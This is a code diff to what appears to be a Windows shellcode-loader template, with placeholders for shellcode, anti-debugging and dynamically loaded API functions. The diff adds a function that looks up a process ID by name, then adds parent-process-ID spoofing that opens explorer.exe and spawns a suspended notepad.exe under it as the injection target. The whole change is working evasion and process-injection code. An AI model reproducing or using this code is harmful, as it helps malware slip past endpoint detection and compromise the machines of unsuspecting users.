@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <iostream>
+#include <TlHelp32.h>
 #include "helper.h"
 
 <SHELLCODE>
@@ -20,6 +21,39 @@ void zero_memory(unsigned char data[], int dataLen)
 	}
 }
 
+DWORD getPidByName(LPCWCHAR proc)
+{
+	HANDLE snapshot;
+	PROCESSENTRY32 curProc;
+	char buf[260];
+	DWORD pid = 0;
+
+	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	curProc.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!Process32First(snapshot, &curProc)) {
+		printf("Failed to retreive pointer to process\n");
+		return -1;
+	}
+
+	do
+	{
+		/*printf("------------------------------\n");
+		wprintf(L"Process name %s\n", curProc.szExeFile);
+		printf("PID: %d\n", curProc.th32ProcessID);
+		printf("Number of threads: %d\n", curProc.cntThreads);
+		printf("PPID: %d\n", curProc.th32ParentProcessID);*/
+		if (!lstrcmpW(curProc.szExeFile, proc))
+		{
+			pid = curProc.th32ProcessID;
+			break;
+		}
+	} while (Process32Next(snapshot, &curProc));
+
+	return pid;
+}
+
 <ANTI_DEBUG>
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
@@ -32,8 +66,6 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	BOOL rv;
 	HANDLE th;
 	DWORD oldProtect = 0;
-	PROCESS_INFORMATION pi = { 0 };
-	STARTUPINFOA si = { 0 };
     CREATEPROCESSA createProcessA;
     OPENPROCESS openProcess;
     VIRTUALALLOCEX virtualAllocEx;
@@ -45,8 +77,26 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
     <LOAD_FUNCTIONS>
 
+    // PPID Spoofing
+    // Initialize vars
+    STARTUPINFOEXA si;
+	PROCESS_INFORMATION pi;
+	SIZE_T attributeSize;
+	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
+
+    // Grab the PID for explorer.exe and get a handle to the process
+    DWORD targetPid = getPidByName(L"explorer.exe");
+    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, targetPid);
+
+    // Mess with the attributes
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
+	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
+	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
+	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
+	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+
 	// Spawn process to inject into
-	createProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	createProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
 	
 
 	//CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
